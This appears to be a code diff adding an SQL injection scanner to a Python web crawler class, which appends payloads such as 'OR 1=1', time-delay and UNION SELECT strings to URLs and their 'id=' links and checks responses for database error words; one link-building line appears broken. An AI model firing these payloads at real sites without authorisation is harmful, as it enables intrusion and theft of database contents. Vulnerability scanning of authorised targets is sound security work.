@@ -2,11 +2,12 @@ import requests
 from bs4 import BeautifulSoup as bs
 from urllib.parse import urlparse, parse_qs, urljoin
 from typing import Optional
-from unsafe.utils.strings import ua
-import json
+# from unsafe.utils.strings import ua
+# import json
 import random
 import string
 import re
+import urllib
 
 
 class Crawler:
@@ -258,3 +259,89 @@ class Crawler:
             "is_vulnerable": is_vulnerable,
             "form_detail": form_details
         }
+
+    def _scan_url(self, url: str) -> list:
+        payloads = [
+            "'", "';", '"', '";',  # Basic payloads
+            "')", '")', "';--", "';#",  # Payloads that try to comment out the rest of the query
+            "'; OR 1=1--", "'; OR 1=1#",  # Payloads that try to always return true
+            "'; OR '1'='1'--", "'; OR '1'='1'#",  # Payloads that try to always return true
+            "'; waitfor delay '0:0:5'--",  # Payload that causes a time delay
+            # Payload that attempts to extract data from the database
+            "'; union select * from users--",
+            # Payload that attempts to extract data from the database
+            "'; union select 1,2,3,4,5,6,7,8,9,10--",
+            # Payload that attempts to extract data from the database
+            "'; union select * from information_schema.tables--",
+        ]
+        # Create a list of indicators to check for
+        check_list = ["error", "mysql", "syntax",
+                      "unexpected", "warning", "sql"]
+        for payload in payloads:
+            # Append the payload to the end of the URL
+            injected_url = url + payload
+            try:
+                # Perform the GET request
+                resp = requests.get(injected_url)
+                # Check the response for indicators of a vulnerability
+                for indicator in check_list:
+                    if indicator in resp.text.lower():
+                        return url
+            except requests.RequestException as e:
+                return ''
+        return ''
+
+    def _extract_links(self, url: str, string: str):
+        """
+        Extract the valid internal links from a web page that contain the specified string in the URL
+        and return them in a list. Remove duplicate links.
+        """
+        # Add the 'http' scheme to the URL if it does not have one
+        parsed_url = urllib.parse.urlparse(url)
+        if not parsed_url.scheme:
+            url = f'http://{url}'
+        # Extract the domain name from the URL
+        domain_name = parsed_url.netloc
+        try:
+            # Send a GET request to the URL and parse the response HTML
+            response = requests.get(url)
+            soup = bs(response.text, 'html.parser')
+            # Find all the anchor tags with URLs that contain the specified string
+            links = []
+            for a in soup.find_all('a', href=True):
+                href = a.get('href')
+                if string in href.lower():
+                    # Add the 'http' scheme to the URL if it does not have one
+                    parsed_href = urllib.parse.urlparse(href)
+                    if not parsed_href.scheme:
+                        href = f'http://{parsed_href}'
+                    if parsed_href.netloc == domain_name:
+                        # Remove the fragment identifier from the URL
+                        href = href.split('#')[0]
+                        # Extract the link URL
+                        links.append(href)
+            # Remove duplicate links
+            links = list(set(links))
+            # Filter out links that are not internal
+            internal_links = []
+            for link in links:
+                parsed_link = urllib.parse.urlparse(link)
+                if parsed_link.netloc == domain_name:
+                    internal_links.append(link)
+            return internal_links
+        except Exception as e:
+            print(
+                f'An error occurred while sending the request or parsing the response: {e}')
+            return []
+
+    def sql_injection_scanner(self, url: str):
+        is_vulnerable = []
+        url_scan = self._scan_url(url)
+        if url_scan:
+            is_vulnerable.append(url_scan)
+        links = self._extract_links(url, 'id=')
+        for link in links:
+            scanning = self._scan_url(link)
+            if scanning:
+                is_vulnerable.append(link)
+        return list(set(is_vulnerable))
